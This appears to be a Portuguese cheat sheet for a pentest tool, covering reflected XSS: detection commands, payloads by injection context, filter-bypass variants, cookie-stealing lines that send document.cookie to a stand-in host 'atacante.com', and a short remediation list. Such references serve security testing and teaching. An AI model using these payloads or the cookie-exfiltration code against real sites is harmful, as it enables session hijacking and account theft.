# XSS Refletido (Reflected Cross-Site Scripting)

## Como Funciona

O payload XSS é inserido em um parâmetro da URL ou formulário, processado pelo servidor, e refletido na resposta HTML, sendo executado no navegador da vítima.

```
Atacante → URL maliciosa → Vítima clica → Servidor reflete XSS → Browser executa
```

## Detecção com vlad.py

```bash
python vlad.py web --alvo "http://alvo.com/?q=teste" --tipo xss
```

## Teste Manual

```bash
# Verificar reflexão
curl "http://alvo.com/?q=VLADTEST" | grep VLADTEST

# Testar payload básico
curl "http://alvo.com/?q=<script>alert(1)</script>"
```

## Payloads por Contexto

### Em HTML (dentro de tag)
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
```

### Em atributo HTML
```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
'><script>alert(1)</script>
```

### Em JavaScript (dentro de <script>)
```javascript
';alert(1)//
\';alert(1)//
"-alert(1)-"
```

### Em URL (href/src)
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## Bypass de Filtros

### Filtros de Palavras-chave
```html
<!-- Variações de script -->
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Eventos alternativos -->
<img src=x onerror="alert`1`">
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
```

### Filtros de Parênteses
```javascript
alert`1`              // template literals
alert.call(window,1)  // call method
```

### Filtros de Aspas
```javascript
alert(String.fromCharCode(88,83,83))
```

## Escalação para Roubo de Cookie

```javascript
// Exfiltrar cookie para servidor do atacante
<script>document.location='http://atacante.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://atacante.com/?c='+btoa(document.cookie))">
```

## Severidade

- **ALTO** quando: sem flag HttpOnly nos cookies de sessão
- **MÉDIO** quando: cookies com HttpOnly (limitado a ataques DOM)
- Pode escalar para roubo de sessão, defacement, phishing

## Remediação

- Sanitizar inputs: `htmlspecialchars()` em PHP, `escapeHtml()` em JS
- Content Security Policy (CSP) adequada
- Flag HttpOnly e Secure nos cookies
- X-XSS-Protection header
